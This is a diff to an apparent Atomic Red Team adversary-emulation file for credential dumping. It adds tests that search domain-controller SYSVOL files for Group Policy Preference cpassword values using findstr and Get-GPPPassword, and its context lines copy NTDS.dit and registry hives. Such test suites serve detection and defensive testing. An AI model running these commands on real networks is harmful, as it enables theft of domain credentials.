@@ -180,3 +180,36 @@ atomic_tests:
       copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
       copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
       reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+
+- name: GPP Passwords (findstr)
+  description: |
+    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      findstr /S cpassword %logonserver%\sysvol\*.xml
+
+- name: GPP Passwords (Get-GPPPassword)
+  description: |
+    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    gpp_script_path:
+      description: Path to the Get-GPPPassword PowerShell Script
+      type: Path
+      default: C:\AtomicRedTeam\atomics\T1003\src\Get-GPPPassword.ps1
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      . #{gpp_script_path}
+      Get-GPPPassword
